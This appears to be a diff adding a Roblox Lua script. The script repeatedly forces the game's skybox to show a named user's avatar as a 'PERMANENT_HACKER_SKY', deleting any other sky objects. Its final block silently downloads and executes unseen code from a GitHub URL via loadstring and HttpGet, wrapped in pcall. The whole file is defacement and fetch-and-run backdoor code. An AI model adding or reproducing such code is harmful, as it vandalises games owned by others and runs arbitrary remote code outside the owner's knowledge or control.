@@ -1,0 +1,53 @@
+local lighting = game:GetService("Lighting")
+local targetUsername = "c00lkkid1ng"
+
+local function getHackerSkyboxUrl()
+    local thumbType = Enum.ThumbnailType.AvatarThumbnail
+    local thumbSize = Enum.ThumbnailSize.Size420x420
+    
+    local success, targetUserId = pcall(function()
+        return game.Players:GetUserIdFromNameAsync(targetUsername)
+    end)
+    
+    if success and targetUserId then
+        local imgSuccess, avatarImageUrl = pcall(function()
+            return game.Players:GetUserThumbnailAsync(targetUserId, thumbType, thumbSize)
+        end)
+        if imgSuccess and avatarImageUrl then
+            return avatarImageUrl
+        end
+    end
+    return nil
+end
+
+local avatarUrl = getHackerSkyboxUrl()
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        if avatarUrl then
+            local activeSky = lighting:FindFirstChildOfClass("Sky")
+            if not activeSky or activeSky.Name ~= "PERMANENT_HACKER_SKY" then
+                for _, obj in pairs(lighting:GetChildren()) do
+                    if obj:IsA("Sky") then obj:Destroy() end
+                end
+                
+                local forceSky = Instance.new("Sky")
+                forceSky.Name = "PERMANENT_HACKER_SKY"
+                forceSky.SkyboxBk = avatarUrl
+                forceSky.SkyboxDn = avatarUrl
+                forceSky.SkyboxFt = avatarUrl
+                forceSky.SkyboxLf = avatarUrl
+                forceSky.SkyboxRt = avatarUrl
+                forceSky.SkyboxUp = avatarUrl
+                forceSky.Parent = lighting
+            end
+        end
+    end
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/V3c0rX18092014/V3c0rX-gui/refs/heads/main/V3c0rX%20gui"))()
+    end)
+end)
